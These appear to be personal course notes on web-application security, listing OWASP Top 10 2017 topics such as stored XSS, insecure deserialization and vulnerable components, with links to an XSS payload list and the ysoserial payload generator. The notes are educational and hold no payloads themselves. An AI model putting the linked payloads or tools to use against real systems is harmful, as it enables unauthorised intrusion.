### Stored XSS Walkthrough

> [!tip] 
> You can find a lot of XSS Payloads on GitHub:
> https://github.com/pgaijin66/XSS-Payloads/blob/master/payload/payload.txt
> 


### Preventing XSS

![[Pasted image 20230408174310.png]]


### Insecure Deserialization

> [!note] 
> Resources for this video:
OWASP A8-Insecure Deserialization: https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization

![[Pasted image 20230408175047.png]]

> [!tip] 
> A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. 
>  https://github.com/frohoff/ysoserial


### Using Components with Known Vulnerabilities

> [!note] 
> Resources for this video:
OWASP A9-Using Components with Known Vulnerabilities: https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities

> [!todo] 
> - Scan Web-App with Nessus
> - Scan Web-App with Burp Suite Pro and some additional plugins


### Insufficient Logging and Monitoring

> [!note] 
> Resources for this video:
OWASP A10-Insufficient Logging & Monitoring: https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring.html

![[Pasted image 20230408175956.png]]


## Wireless Penetration Testing


### 001 Wireless Penetration Testing Overview

